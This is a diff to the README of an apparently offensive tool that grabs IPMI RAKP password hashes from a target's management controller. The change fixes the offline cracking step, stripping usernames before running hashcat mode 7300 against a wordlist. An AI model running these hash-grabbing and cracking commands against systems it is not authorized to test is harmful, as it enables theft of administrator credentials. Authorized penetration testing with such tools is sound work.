@@ -30,8 +30,10 @@ python3 ipmi_rakp_grab.py <IP> -u admin sysadmin
 # username wordlist (one per line) + save results
 python3 ipmi_rakp_grab.py <IP> -U users.txt -o hash.txt
 
-# crack offline
-hashcat -m 7300 hash.txt /usr/share/wordlists/rockyou.txt
+# crack offline — output is `user:salt:hash` (metasploit-style), so strip the
+# username first: hashcat -m 7300 expects only `salt:hash`
+cut -d: -f2- hash.txt > hashcat_ready.txt
+hashcat -m 7300 hashcat_ready.txt /usr/share/wordlists/rockyou.txt
 ```
 
 Options: `-p` UDP port (default 623), `-t` timeout in seconds (default 5).
